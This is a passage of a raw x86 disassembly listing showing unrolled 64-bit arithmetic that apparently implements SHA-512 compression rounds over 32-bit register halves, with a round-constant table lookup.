  403a5d:	8b ea                	mov    %edx,%ebp
  403a5f:	89 8c 24 dc 00 00 00 	mov    %ecx,0xdc(%esp)
  403a66:	89 94 24 e8 00 00 00 	mov    %edx,0xe8(%esp)
  403a6d:	89 bc 24 10 01 00 00 	mov    %edi,0x110(%esp)
  403a74:	89 bc 24 f4 00 00 00 	mov    %edi,0xf4(%esp)
  403a7b:	89 8c 24 f8 00 00 00 	mov    %ecx,0xf8(%esp)
  403a82:	89 94 24 00 01 00 00 	mov    %edx,0x100(%esp)
  403a89:	89 94 24 04 01 00 00 	mov    %edx,0x104(%esp)
  403a90:	89 8c 24 0c 01 00 00 	mov    %ecx,0x10c(%esp)
  403a97:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403a9e:	00 
  403a9f:	89 4c 24 64          	mov    %ecx,0x64(%esp)
  403aa3:	89 4c 24 78          	mov    %ecx,0x78(%esp)
  403aa7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403aae:	00 00 
  403ab0:	8b 94 24 88 00 00 00 	mov    0x88(%esp),%edx
  403ab7:	8b bc 24 9c 00 00 00 	mov    0x9c(%esp),%edi
  403abe:	f7 d2                	not    %edx
  403ac0:	8b 8c 24 a8 00 00 00 	mov    0xa8(%esp),%ecx
  403ac7:	23 d3                	and    %ebx,%edx
  403ac9:	8b 9c 24 20 01 00 00 	mov    0x120(%esp),%ebx
  403ad0:	23 ce                	and    %esi,%ecx
  403ad2:	8b b4 24 f0 00 00 00 	mov    0xf0(%esp),%esi
  403ad9:	33 d1                	xor    %ecx,%edx
  403adb:	c1 6c 24 20 09       	shrl   $0x9,0x20(%esp)
  403ae0:	c1 ed 0e             	shr    $0xe,%ebp
  403ae3:	c1 ac 24 84 00 00 00 	shrl   $0x12,0x84(%esp)
  403aea:	12 
  403aeb:	c1 eb 09             	shr    $0x9,%ebx
  403aee:	c1 e0 12             	shl    $0x12,%eax
  403af1:	0b e8                	or     %eax,%ebp
  403af3:	c1 e7 17             	shl    $0x17,%edi
  403af6:	0b fb                	or     %ebx,%edi
  403af8:	c1 ac 24 80 00 00 00 	shrl   $0xe,0x80(%esp)
  403aff:	0e 
  403b00:	8b 9c 24 14 01 00 00 	mov    0x114(%esp),%ebx
  403b07:	c1 e6 0e             	shl    $0xe,%esi
  403b0a:	c1 eb 12             	shr    $0x12,%ebx
  403b0d:	0b de                	or     %esi,%ebx
  403b0f:	89 94 24 88 00 00 00 	mov    %edx,0x88(%esp)
  403b16:	33 fb                	xor    %ebx,%edi
  403b18:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403b1c:	33 fd                	xor    %ebp,%edi
  403b1e:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  403b22:	03 fa                	add    %edx,%edi
  403b24:	8b 94 24 ac 00 00 00 	mov    0xac(%esp),%edx
  403b2b:	23 54 24 10          	and    0x10(%esp),%edx
  403b2f:	8b b5 9c f2 41 00    	mov    0x41f29c(%ebp),%esi
  403b35:	8b 8c 2c 34 01 00 00 	mov    0x134(%esp,%ebp,1),%ecx
  403b3c:	8b ac 24 a0 00 00 00 	mov    0xa0(%esp),%ebp
  403b43:	c1 e5 17             	shl    $0x17,%ebp
  403b46:	09 6c 24 20          	or     %ebp,0x20(%esp)
  403b4a:	8d 04 37             	lea    (%edi,%esi,1),%eax
  403b4d:	8b ac 24 1c 01 00 00 	mov    0x11c(%esp),%ebp
  403b54:	03 c1                	add    %ecx,%eax
  403b56:	c1 e5 0e             	shl    $0xe,%ebp
  403b59:	03 d8                	add    %eax,%ebx
  403b5b:	0b ac 24 84 00 00 00 	or     0x84(%esp),%ebp
  403b62:	31 6c 24 20          	xor    %ebp,0x20(%esp)
  403b66:	8b ac 24 b4 00 00 00 	mov    0xb4(%esp),%ebp
  403b6d:	c1 e5 12             	shl    $0x12,%ebp
  403b70:	0b ac 24 80 00 00 00 	or     0x80(%esp),%ebp
  403b77:	31 6c 24 20          	xor    %ebp,0x20(%esp)
  403b7b:	8b ac 24 a4 00 00 00 	mov    0xa4(%esp),%ebp
  403b82:	f7 d5                	not    %ebp
  403b84:	23 6c 24 2c          	and    0x2c(%esp),%ebp
  403b88:	33 ea                	xor    %edx,%ebp
  403b8a:	8d 14 37             	lea    (%edi,%esi,1),%edx
  403b8d:	01 6c 24 20          	add    %ebp,0x20(%esp)
  403b91:	3b c1                	cmp    %ecx,%eax
  403b93:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403b97:	1b c0                	sbb    %eax,%eax
  403b99:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  403b9d:	f7 d8                	neg    %eax
  403b9f:	03 c8                	add    %eax,%ecx
  403ba1:	3b d6                	cmp    %esi,%edx
  403ba3:	8b b4 24 8c 00 00 00 	mov    0x8c(%esp),%esi
  403baa:	1b c0                	sbb    %eax,%eax
  403bac:	f7 d8                	neg    %eax
  403bae:	3b 9c 24 b0 00 00 00 	cmp    0xb0(%esp),%ebx
  403bb5:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  403bb8:	1b c0                	sbb    %eax,%eax
  403bba:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  403bc1:	f7 d8                	neg    %eax
  403bc3:	03 d0                	add    %eax,%edx
  403bc5:	3b bc 24 88 00 00 00 	cmp    0x88(%esp),%edi
  403bcc:	1b c0                	sbb    %eax,%eax
  403bce:	c1 ee 07             	shr    $0x7,%esi
  403bd1:	f7 d8                	neg    %eax
  403bd3:	03 d0                	add    %eax,%edx
  403bd5:	03 95 98 f2 41 00    	add    0x41f298(%ebp),%edx
  403bdb:	03 94 2c 30 01 00 00 	add    0x130(%esp,%ebp,1),%edx
  403be2:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  403be6:	8b c5                	mov    %ebp,%eax
  403be8:	03 54 24 30          	add    0x30(%esp),%edx
  403bec:	c1 e0 19             	shl    $0x19,%eax
  403bef:	0b f0                	or     %eax,%esi
  403bf1:	c1 e9 02             	shr    $0x2,%ecx
  403bf4:	8b c5                	mov    %ebp,%eax
  403bf6:	c1 e0 1e             	shl    $0x1e,%eax
  403bf9:	0b c8                	or     %eax,%ecx
  403bfb:	8b c5                	mov    %ebp,%eax
  403bfd:	33 f1                	xor    %ecx,%esi
  403bff:	c1 e8 1c             	shr    $0x1c,%eax
  403c02:	8b 4c 24 70          	mov    0x70(%esp),%ecx
  403c06:	c1 e1 04             	shl    $0x4,%ecx
  403c09:	0b c8                	or     %eax,%ecx
  403c0b:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403c0f:	33 f1                	xor    %ecx,%esi
  403c11:	8b c8                	mov    %eax,%ecx
  403c13:	33 c5                	xor    %ebp,%eax
  403c15:	89 b4 24 8c 00 00 00 	mov    %esi,0x8c(%esp)
  403c1c:	23 44 24 44          	and    0x44(%esp),%eax
  403c20:	23 cd                	and    %ebp,%ecx
  403c22:	89 8c 24 90 00 00 00 	mov    %ecx,0x90(%esp)
  403c29:	33 c8                	xor    %eax,%ecx
  403c2b:	8b 44 24 48          	mov    0x48(%esp),%eax
  403c2f:	03 ce                	add    %esi,%ecx
  403c31:	8d 2c 18             	lea    (%eax,%ebx,1),%ebp
  403c34:	3b e8                	cmp    %eax,%ebp
  403c36:	89 6c 24 30          	mov    %ebp,0x30(%esp)
  403c3a:	8b 44 24 34          	mov    0x34(%esp),%eax
  403c3e:	8d 3c 19             	lea    (%ecx,%ebx,1),%edi
  403c41:	1b f6                	sbb    %esi,%esi
  403c43:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  403c47:	c1 64 24 18 19       	shll   $0x19,0x18(%esp)
  403c4c:	f7 de                	neg    %esi
  403c4e:	03 74 24 4c          	add    0x4c(%esp),%esi
  403c52:	c1 64 24 38 1e       	shll   $0x1e,0x38(%esp)
  403c57:	03 f2                	add    %edx,%esi
  403c59:	c1 6c 24 24 1c       	shrl   $0x1c,0x24(%esp)
  403c5e:	c1 e8 07             	shr    $0x7,%eax
  403c61:	09 44 24 18          	or     %eax,0x18(%esp)
  403c65:	8b 44 24 34          	mov    0x34(%esp),%eax
  403c69:	c1 e8 02             	shr    $0x2,%eax
  403c6c:	09 44 24 38          	or     %eax,0x38(%esp)
  403c70:	8b 44 24 38          	mov    0x38(%esp),%eax
  403c74:	31 44 24 18          	xor    %eax,0x18(%esp)
  403c78:	8b 44 24 34          	mov    0x34(%esp),%eax
  403c7c:	c1 e0 04             	shl    $0x4,%eax
  403c7f:	09 44 24 24          	or     %eax,0x24(%esp)
  403c83:	8b 44 24 18          	mov    0x18(%esp),%eax
  403c87:	33 44 24 24          	xor    0x24(%esp),%eax
  403c8b:	89 74 24 4c          	mov    %esi,0x4c(%esp)
  403c8f:	8b b4 24 c0 00 00 00 	mov    0xc0(%esp),%esi
  403c96:	21 74 24 54          	and    %esi,0x54(%esp)
  403c9a:	8b b4 24 bc 00 00 00 	mov    0xbc(%esp),%esi
  403ca1:	23 74 24 28          	and    0x28(%esp),%esi
  403ca5:	31 74 24 54          	xor    %esi,0x54(%esp)
  403ca9:	8b b4 24 b8 00 00 00 	mov    0xb8(%esp),%esi
  403cb0:	23 74 24 40          	and    0x40(%esp),%esi
  403cb4:	31 74 24 54          	xor    %esi,0x54(%esp)
  403cb8:	03 44 24 54          	add    0x54(%esp),%eax
  403cbc:	3b 8c 24 8c 00 00 00 	cmp    0x8c(%esp),%ecx
  403cc3:	8b 74 24 4c          	mov    0x4c(%esp),%esi
  403cc7:	89 44 24 18          	mov    %eax,0x18(%esp)
  403ccb:	1b c0                	sbb    %eax,%eax
  403ccd:	f7 d8                	neg    %eax
  403ccf:	03 c2                	add    %edx,%eax
  403cd1:	3b fb                	cmp    %ebx,%edi
  403cd3:	8b dd                	mov    %ebp,%ebx
  403cd5:	8b d5                	mov    %ebp,%edx
  403cd7:	1b c9                	sbb    %ecx,%ecx
  403cd9:	f7 d3                	not    %ebx
  403cdb:	03 44 24 18          	add    0x18(%esp),%eax
  403cdf:	f7 d9                	neg    %ecx
  403ce1:	23 9c 24 c4 00 00 00 	and    0xc4(%esp),%ebx
  403ce8:	03 c8                	add    %eax,%ecx
  403cea:	8b 84 24 cc 00 00 00 	mov    0xcc(%esp),%eax
  403cf1:	23 c5                	and    %ebp,%eax
  403cf3:	89 4c 24 48          	mov    %ecx,0x48(%esp)
  403cf7:	33 d8                	xor    %eax,%ebx
  403cf9:	c1 ea 0e             	shr    $0xe,%edx
  403cfc:	8b c6                	mov    %esi,%eax
  403cfe:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  403d02:	c1 e0 12             	shl    $0x12,%eax
  403d05:	8b ce                	mov    %esi,%ecx
  403d07:	0b d0                	or     %eax,%edx
  403d09:	c1 e9 09             	shr    $0x9,%ecx
  403d0c:	8b c5                	mov    %ebp,%eax
  403d0e:	c1 ed 12             	shr    $0x12,%ebp
  403d11:	c1 e0 17             	shl    $0x17,%eax
  403d14:	0b c8                	or     %eax,%ecx
  403d16:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403d1a:	33 d1                	xor    %ecx,%edx
  403d1c:	8b ce                	mov    %esi,%ecx
  403d1e:	c1 e1 0e             	shl    $0xe,%ecx
  403d21:	0b e9                	or     %ecx,%ebp
  403d23:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  403d27:	8b b4 04 3c 01 00 00 	mov    0x13c(%esp,%eax,1),%esi
  403d2e:	33 ea                	xor    %edx,%ebp
  403d30:	c1 e9 0e             	shr    $0xe,%ecx
  403d33:	03 eb                	add    %ebx,%ebp
  403d35:	8b 98 a4 f2 41 00    	mov    0x41f2a4(%eax),%ebx
  403d3b:	8b 44 24 30          	mov    0x30(%esp),%eax
  403d3f:	c1 e0 12             	shl    $0x12,%eax
  403d42:	0b c8                	or     %eax,%ecx
  403d44:	8b 44 24 30          	mov    0x30(%esp),%eax
  403d48:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403d4c:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  403d4f:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  403d53:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  403d56:	c1 e9 12             	shr    $0x12,%ecx
  403d59:	c1 e0 0e             	shl    $0xe,%eax
  403d5c:	0b c8                	or     %eax,%ecx
  403d5e:	8b 44 24 30          	mov    0x30(%esp),%eax
  403d62:	31 4c 24 14          	xor    %ecx,0x14(%esp)
  403d66:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  403d6a:	c1 e1 17             	shl    $0x17,%ecx
  403d6d:	c1 e8 09             	shr    $0x9,%eax
  403d70:	0b c8                	or     %eax,%ecx
  403d72:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  403d76:	31 4c 24 14          	xor    %ecx,0x14(%esp)
  403d7a:	8b c8                	mov    %eax,%ecx
  403d7c:	23 84 24 d0 00 00 00 	and    0xd0(%esp),%eax
  403d83:	f7 d1                	not    %ecx
  403d85:	23 8c 24 c8 00 00 00 	and    0xc8(%esp),%ecx
  403d8c:	33 c8                	xor    %eax,%ecx
  403d8e:	01 4c 24 14          	add    %ecx,0x14(%esp)
  403d92:	3b d6                	cmp    %esi,%edx
  403d94:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403d98:	1b c0                	sbb    %eax,%eax
  403d9a:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  403d9e:	f7 d8                	neg    %eax
  403da0:	03 c8                	add    %eax,%ecx
  403da2:	3b fb                	cmp    %ebx,%edi
  403da4:	8b 9c 24 d4 00 00 00 	mov    0xd4(%esp),%ebx
  403dab:	1b c0                	sbb    %eax,%eax
  403dad:	f7 d8                	neg    %eax
  403daf:	03 c8                	add    %eax,%ecx
  403db1:	3b 6c 24 5c          	cmp    0x5c(%esp),%ebp
  403db5:	1b c0                	sbb    %eax,%eax
  403db7:	03 da                	add    %edx,%ebx
  403db9:	8b 54 24 48          	mov    0x48(%esp),%edx
  403dbd:	f7 d8                	neg    %eax
  403dbf:	03 c8                	add    %eax,%ecx
  403dc1:	8b fa                	mov    %edx,%edi
  403dc3:	3b 9c 24 d8 00 00 00 	cmp    0xd8(%esp),%ebx
  403dca:	1b c0                	sbb    %eax,%eax
  403dcc:	c1 e7 04             	shl    $0x4,%edi
  403dcf:	f7 d8                	neg    %eax
  403dd1:	03 c8                	add    %eax,%ecx
  403dd3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403dd7:	03 88 a0 f2 41 00    	add    0x41f2a0(%eax),%ecx
  403ddd:	03 8c 04 38 01 00 00 	add    0x138(%esp,%eax,1),%ecx
  403de4:	8b c6                	mov    %esi,%eax
  403de6:	03 4c 24 7c          	add    0x7c(%esp),%ecx
  403dea:	c1 e8 1c             	shr    $0x1c,%eax
  403ded:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403df1:	0b f8                	or     %eax,%edi
  403df3:	8b ca                	mov    %edx,%ecx
  403df5:	8b c6                	mov    %esi,%eax
  403df7:	c1 e9 02             	shr    $0x2,%ecx
  403dfa:	c1 e0 1e             	shl    $0x1e,%eax
  403dfd:	0b c8                	or     %eax,%ecx
  403dff:	8b c6                	mov    %esi,%eax
  403e01:	33 f9                	xor    %ecx,%edi
  403e03:	8b ca                	mov    %edx,%ecx
  403e05:	c1 e9 07             	shr    $0x7,%ecx
  403e08:	c1 e0 19             	shl    $0x19,%eax
  403e0b:	0b c8                	or     %eax,%ecx
  403e0d:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  403e14:	00 
  403e15:	33 f9                	xor    %ecx,%edi
  403e17:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  403e1b:	33 4c 24 34          	xor    0x34(%esp),%ecx
  403e1f:	23 f1                	and    %ecx,%esi
  403e21:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  403e25:	33 b4 24 90 00 00 00 	xor    0x90(%esp),%esi
  403e2c:	03 f7                	add    %edi,%esi
  403e2e:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  403e31:	3b c1                	cmp    %ecx,%eax
  403e33:	89 44 24 50          	mov    %eax,0x50(%esp)
  403e37:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  403e3b:	1b c0                	sbb    %eax,%eax
  403e3d:	8b 6c 24 50          	mov    0x50(%esp),%ebp
  403e41:	f7 d8                	neg    %eax
  403e43:	c1 e1 1e             	shl    $0x1e,%ecx
  403e46:	03 44 24 14          	add    0x14(%esp),%eax
  403e4a:	03 84 24 e4 00 00 00 	add    0xe4(%esp),%eax
  403e51:	89 44 24 28          	mov    %eax,0x28(%esp)
  403e55:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  403e58:	89 44 24 58          	mov    %eax,0x58(%esp)
  403e5c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e60:	c1 e8 07             	shr    $0x7,%eax
  403e63:	c1 e2 19             	shl    $0x19,%edx
  403e66:	0b d0                	or     %eax,%edx
  403e68:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e6c:	c1 e8 02             	shr    $0x2,%eax
  403e6f:	0b c8                	or     %eax,%ecx
  403e71:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e75:	33 d1                	xor    %ecx,%edx
  403e77:	c1 e0 04             	shl    $0x4,%eax
  403e7a:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  403e7e:	c1 e9 1c             	shr    $0x1c,%ecx
  403e81:	0b c8                	or     %eax,%ecx
  403e83:	8b 84 24 e0 00 00 00 	mov    0xe0(%esp),%eax
  403e8a:	33 84 24 dc 00 00 00 	xor    0xdc(%esp),%eax
  403e91:	33 d1                	xor    %ecx,%edx
  403e93:	23 44 24 48          	and    0x48(%esp),%eax
  403e97:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  403e9b:	23 4c 24 74          	and    0x74(%esp),%ecx
  403e9f:	33 c1                	xor    %ecx,%eax
  403ea1:	8d 0c 33             	lea    (%ebx,%esi,1),%ecx
  403ea4:	03 d0                	add    %eax,%edx
  403ea6:	3b cb                	cmp    %ebx,%ecx
  403ea8:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  403eac:	1b c0                	sbb    %eax,%eax
  403eae:	f7 d8                	neg    %eax
  403eb0:	03 44 24 14          	add    0x14(%esp),%eax
  403eb4:	3b f7                	cmp    %edi,%esi
  403eb6:	8b 74 24 28          	mov    0x28(%esp),%esi
  403eba:	1b c9                	sbb    %ecx,%ecx
  403ebc:	03 c2                	add    %edx,%eax
  403ebe:	f7 d9                	neg    %ecx
  403ec0:	23 dd                	and    %ebp,%ebx
  403ec2:	03 c8                	add    %eax,%ecx
  403ec4:	8b d6                	mov    %esi,%edx
  403ec6:	8b c5                	mov    %ebp,%eax
  403ec8:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  403ecc:	f7 d0                	not    %eax
  403ece:	c1 ea 09             	shr    $0x9,%edx
  403ed1:	23 84 24 e8 00 00 00 	and    0xe8(%esp),%eax
  403ed8:	8b ce                	mov    %esi,%ecx
  403eda:	33 d8                	xor    %eax,%ebx
  403edc:	c1 e1 0e             	shl    $0xe,%ecx
  403edf:	8b c5                	mov    %ebp,%eax
  403ee1:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  403ee5:	c1 e0 17             	shl    $0x17,%eax
  403ee8:	0b d0                	or     %eax,%edx
  403eea:	8b c5                	mov    %ebp,%eax
  403eec:	c1 e8 12             	shr    $0x12,%eax
  403eef:	0b c8                	or     %eax,%ecx
  403ef1:	c1 ed 0e             	shr    $0xe,%ebp
  403ef4:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403ef8:	33 d1                	xor    %ecx,%edx
  403efa:	8b ce                	mov    %esi,%ecx
  403efc:	c1 e1 12             	shl    $0x12,%ecx
  403eff:	0b e9                	or     %ecx,%ebp
  403f01:	33 ea                	xor    %edx,%ebp
  403f03:	03 eb                	add    %ebx,%ebp
  403f05:	8b 98 ac f2 41 00    	mov    0x41f2ac(%eax),%ebx
  403f0b:	8b b4 04 44 01 00 00 	mov    0x144(%esp,%eax,1),%esi
  403f12:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  403f15:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403f19:	8b 44 24 50          	mov    0x50(%esp),%eax
  403f1d:	c1 e9 0e             	shr    $0xe,%ecx
  403f20:	c1 e0 12             	shl    $0x12,%eax
  403f23:	8d 14 3e             	lea    (%esi,%edi,1),%edx
  403f26:	0b c8                	or     %eax,%ecx
  403f28:	8b 44 24 50          	mov    0x50(%esp),%eax
  403f2c:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403f30:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403f34:	c1 e9 12             	shr    $0x12,%ecx
  403f37:	c1 e0 0e             	shl    $0xe,%eax
  403f3a:	0b c8                	or     %eax,%ecx
  403f3c:	8b 44 24 50          	mov    0x50(%esp),%eax
  403f40:	31 4c 24 14          	xor    %ecx,0x14(%esp)
  403f44:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403f48:	c1 e1 17             	shl    $0x17,%ecx
  403f4b:	c1 e8 09             	shr    $0x9,%eax
  403f4e:	0b c8                	or     %eax,%ecx
  403f50:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  403f54:	31 4c 24 14          	xor    %ecx,0x14(%esp)
  403f58:	23 44 24 28          	and    0x28(%esp),%eax
  403f5c:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403f60:	f7 d1                	not    %ecx
  403f62:	23 8c 24 ec 00 00 00 	and    0xec(%esp),%ecx
  403f69:	33 c8                	xor    %eax,%ecx
  403f6b:	01 4c 24 14          	add    %ecx,0x14(%esp)
  403f6f:	3b d6                	cmp    %esi,%edx
  403f71:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403f75:	1b c0                	sbb    %eax,%eax
  403f77:	f7 d8                	neg    %eax
  403f79:	03 c8                	add    %eax,%ecx
  403f7b:	3b fb                	cmp    %ebx,%edi
  403f7d:	8b 9c 24 10 01 00 00 	mov    0x110(%esp),%ebx
  403f84:	1b c0                	sbb    %eax,%eax
  403f86:	f7 d8                	neg    %eax
  403f88:	03 c8                	add    %eax,%ecx
  403f8a:	3b 6c 24 5c          	cmp    0x5c(%esp),%ebp
  403f8e:	8b 6c 24 58          	mov    0x58(%esp),%ebp
  403f92:	1b c0                	sbb    %eax,%eax
  403f94:	03 da                	add    %edx,%ebx
  403f96:	8b 54 24 44          	mov    0x44(%esp),%edx
  403f9a:	f7 d8                	neg    %eax
  403f9c:	03 c8                	add    %eax,%ecx
  403f9e:	8b fa                	mov    %edx,%edi
  403fa0:	3b 9c 24 f4 00 00 00 	cmp    0xf4(%esp),%ebx
  403fa7:	1b c0                	sbb    %eax,%eax
  403fa9:	c1 e7 04             	shl    $0x4,%edi
  403fac:	f7 d8                	neg    %eax
  403fae:	03 c8                	add    %eax,%ecx
  403fb0:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403fb4:	03 88 a8 f2 41 00    	add    0x41f2a8(%eax),%ecx
  403fba:	03 8c 04 40 01 00 00 	add    0x140(%esp,%eax,1),%ecx
  403fc1:	8b c5                	mov    %ebp,%eax
  403fc3:	03 4c 24 6c          	add    0x6c(%esp),%ecx
  403fc7:	c1 e8 1c             	shr    $0x1c,%eax
  403fca:	0b f8                	or     %eax,%edi
  403fcc:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403fd0:	8b ca                	mov    %edx,%ecx
  403fd2:	8b c5                	mov    %ebp,%eax
  403fd4:	c1 e9 02             	shr    $0x2,%ecx
  403fd7:	c1 e0 1e             	shl    $0x1e,%eax
  403fda:	0b c8                	or     %eax,%ecx
  403fdc:	8b c5                	mov    %ebp,%eax
  403fde:	33 f9                	xor    %ecx,%edi
  403fe0:	c1 e0 19             	shl    $0x19,%eax
  403fe3:	8b ca                	mov    %edx,%ecx
  403fe5:	c1 e9 07             	shr    $0x7,%ecx
  403fe8:	0b c8                	or     %eax,%ecx
  403fea:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403fee:	33 f9                	xor    %ecx,%edi
  403ff0:	8b c8                	mov    %eax,%ecx
  403ff2:	33 c5                	xor    %ebp,%eax
  403ff4:	23 cd                	and    %ebp,%ecx
  403ff6:	23 44 24 34          	and    0x34(%esp),%eax
  403ffa:	33 c1                	xor    %ecx,%eax
  403ffc:	89 4c 24 74          	mov    %ecx,0x74(%esp)
  404000:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  404004:	8d 34 38             	lea    (%eax,%edi,1),%esi
  404007:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  40400a:	3b c1                	cmp    %ecx,%eax
  40400c:	89 44 24 40          	mov    %eax,0x40(%esp)
  404010:	8b cd                	mov    %ebp,%ecx
  404012:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  404019:	00 
  40401a:	1b c0                	sbb    %eax,%eax
  40401c:	c1 e9 07             	shr    $0x7,%ecx
  40401f:	f7 d8                	neg    %eax
  404021:	c1 e2 19             	shl    $0x19,%edx
  404024:	03 84 24 fc 00 00 00 	add    0xfc(%esp),%eax
  40402b:	0b d1                	or     %ecx,%edx
  40402d:	03 44 24 14          	add    0x14(%esp),%eax
  404031:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  404035:	89 44 24 18          	mov    %eax,0x18(%esp)
  404039:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  40403c:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  404040:	8b c5                	mov    %ebp,%eax
  404042:	c1 e8 02             	shr    $0x2,%eax
  404045:	c1 e1 1e             	shl    $0x1e,%ecx
  404048:	0b c8                	or     %eax,%ecx
  40404a:	8b c5                	mov    %ebp,%eax
  40404c:	33 d1                	xor    %ecx,%edx
  40404e:	c1 e0 04             	shl    $0x4,%eax
  404051:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  404055:	c1 e9 1c             	shr    $0x1c,%ecx
  404058:	0b c8                	or     %eax,%ecx
  40405a:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  40405e:	8b 44 24 48          	mov    0x48(%esp),%eax
  404062:	33 d1                	xor    %ecx,%edx
  404064:	8b 8c 24 f8 00 00 00 	mov    0xf8(%esp),%ecx
  40406b:	33 c8                	xor    %eax,%ecx
  40406d:	23 44 24 78          	and    0x78(%esp),%eax
  404071:	23 4c 24 44          	and    0x44(%esp),%ecx
  404075:	33 c8                	xor    %eax,%ecx
  404077:	03 d1                	add    %ecx,%edx
  404079:	39 5c 24 3c          	cmp    %ebx,0x3c(%esp)
  40407d:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  404081:	1b c0                	sbb    %eax,%eax
  404083:	f7 d8                	neg    %eax
  404085:	03 44 24 14          	add    0x14(%esp),%eax
  404089:	3b f7                	cmp    %edi,%esi
  40408b:	8b 74 24 40          	mov    0x40(%esp),%esi
  40408f:	1b c9                	sbb    %ecx,%ecx
  404091:	03 c2                	add    %edx,%eax
  404093:	f7 d9                	neg    %ecx
  404095:	23 de                	and    %esi,%ebx
  404097:	03 c8                	add    %eax,%ecx
  404099:	8b d6                	mov    %esi,%edx
  40409b:	8b c6                	mov    %esi,%eax
  40409d:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  4040a1:	f7 d0                	not    %eax
  4040a3:	c1 ea 12             	shr    $0x12,%edx
  4040a6:	23 44 24 30          	and    0x30(%esp),%eax
  4040aa:	8b ce                	mov    %esi,%ecx
  4040ac:	33 d8                	xor    %eax,%ebx
  4040ae:	c1 e1 17             	shl    $0x17,%ecx
  4040b1:	8b c5                	mov    %ebp,%eax
  4040b3:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  4040b7:	c1 e0 0e             	shl    $0xe,%eax
  4040ba:	0b d0                	or     %eax,%edx
  4040bc:	8b c5                	mov    %ebp,%eax
  4040be:	c1 e8 09             	shr    $0x9,%eax
  4040c1:	0b c8                	or     %eax,%ecx
  4040c3:	8b c5                	mov    %ebp,%eax
  4040c5:	33 d1                	xor    %ecx,%edx
  4040c7:	c1 e0 12             	shl    $0x12,%eax
  4040ca:	8b ce                	mov    %esi,%ecx
  4040cc:	c1 e9 0e             	shr    $0xe,%ecx
  4040cf:	0b c8                	or     %eax,%ecx
  4040d1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4040d5:	33 d1                	xor    %ecx,%edx
  4040d7:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4040db:	03 d3                	add    %ebx,%edx
  4040dd:	8b a8 b4 f2 41 00    	mov    0x41f2b4(%eax),%ebp
  4040e3:	8b bc 04 4c 01 00 00 	mov    0x14c(%esp,%eax,1),%edi
  4040ea:	8b 84 24 00 01 00 00 	mov    0x100(%esp),%eax
  4040f1:	8d 1c 2a             	lea    (%edx,%ebp,1),%ebx
  4040f4:	8d 34 1f             	lea    (%edi,%ebx,1),%esi
  4040f7:	03 c6                	add    %esi,%eax
  4040f9:	c1 e9 09             	shr    $0x9,%ecx
  4040fc:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  404100:	8b 44 24 18          	mov    0x18(%esp),%eax
  404104:	c1 e0 17             	shl    $0x17,%eax
  404107:	0b c8                	or     %eax,%ecx
  404109:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%esp)
  404110:	00 
  404111:	8b 44 24 18          	mov    0x18(%esp),%eax
  404115:	c1 e8 12             	shr    $0x12,%eax
  404118:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  40411c:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  404120:	c1 e1 0e             	shl    $0xe,%ecx
  404123:	0b c8                	or     %eax,%ecx
  404125:	8b 44 24 18          	mov    0x18(%esp),%eax
